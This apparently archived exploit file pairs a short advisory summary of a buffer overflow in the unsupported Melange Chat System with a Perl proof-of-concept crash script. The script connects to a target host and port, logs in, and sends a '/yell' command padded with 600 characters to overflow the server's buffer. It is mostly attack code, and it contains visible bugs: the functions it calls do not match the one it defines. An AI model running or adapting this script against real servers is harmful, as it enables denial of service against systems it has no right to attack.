@@ -1,0 +1,87 @@
+source: http://www.securityfocus.com/bid/4508/info
+
+Melange Chat System is a chat server program developed by Christian Walter. Currently support for this application is no longer available.
+
+Due to inadequate bounds checking in Melange, it is possible for users to initiate a buffer overflow.
+
+Submitting an unusually large /yell argument composed of arbitrary data, could cause the overflow to occur. 
+
+#!/usr/bin/perl
+#Melange Chat Server Remote DDOS POC
+#By DVDMAN (DVDMAN@L33TSECURITY.COM)
+#WWW.L33TSECURITY.COM
+#L33T SECURITY
+
+
+use Getopt::Std;
+use IO::Socket;
+$|=1;
+
+
+my %options;
+getopt('Hhp',\%options);
+$arg2 = shift(@ARGV);
+$options{h} && usage();
+if ($options{H})
+{
+do_melage();
+}
+if ($options{p})
+{
+do_malange();
+}
+else
+{
+usage();
+}
+sub usage()
+{
+    print("[L33TSECURITY] Malange Chat Remote DDOS\n");
+    print(" (C) DVDMAN \n\n");
+    print("Usage: $0 [options]\n");
+    print("-H = hostname or ip REQUIRED\n");
+    print("-p = port of ftp server REQUIRED\n");
+}
+  
+exit(1);
+
+ 
+
+sub malange() {
+my $test = $options{H};
+my $test2 = $options{p};
+
+    $remote = IO::Socket::INET->new(
+                        Proto     => "tcp",
+                                PeerAddr  => $test,
+                                PeerPort  => $test2,
+        );
+    unless ($remote) {
+           print"error cannot connect";
+           return
+        }
+    $remote->autoflush(1);
+
+
+print STDERR "Melange Chat Server REMOTE DDOS BY DVDMAN\n";
+print STDERR " starting attack in 5 seconds...\n";
+sleep(5);
+
+my $user = "user test test 0 0\r\n";
+my $exploit = "/yell" . " " . "A"x600;
+
+
+print $remote $user;
+print $remote $exploit;
+print STDERR "DONE\n"; 
+die "BYE\n";
+}
+
+
+
+
+
+#By DVDMAN (DVDMAN@L33TSECURITY.COM)
+#WWW.L33TSECURITY.COM
+#L33T SECURITY
+
